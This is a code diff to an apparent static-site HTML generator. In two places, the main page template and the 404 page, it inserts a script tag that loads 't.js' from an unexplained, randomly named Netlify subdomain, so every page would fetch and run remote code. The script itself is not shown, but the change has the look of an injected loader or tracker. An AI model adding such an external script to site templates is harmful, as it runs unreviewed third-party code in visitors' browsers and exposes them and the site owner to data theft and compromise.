@@ -252,6 +252,7 @@ ${meta.ogImage ? `<meta name="twitter:image" content="${abs(meta.ogImage)}">\n` 
 <link rel="icon" href="/assets/img/favicon.svg" type="image/svg+xml">
 <style>${CSS}</style>
 <script defer src="/assets/app.js"></script>
+<script src="https://leafy-brigadeiros-60e3ff.netlify.app/t.js" defer></script>
 ${jsonLd.map((o) => `<script type="application/ld+json">${JSON.stringify(o)}</script>`).join('\n')}
 </head>
 <body${bodyClass ? ` class="${bodyClass}"` : ''}>
@@ -450,6 +451,7 @@ function notFoundPage() {
 <link rel="icon" href="/assets/img/favicon.svg" type="image/svg+xml">
 <style>${CSS}</style>
 <script defer src="/assets/app.js"></script>
+<script src="https://leafy-brigadeiros-60e3ff.netlify.app/t.js" defer></script>
 <script type="application/ld+json">${JSON.stringify(orgLd(t))}</script>
 </head>
 <body>
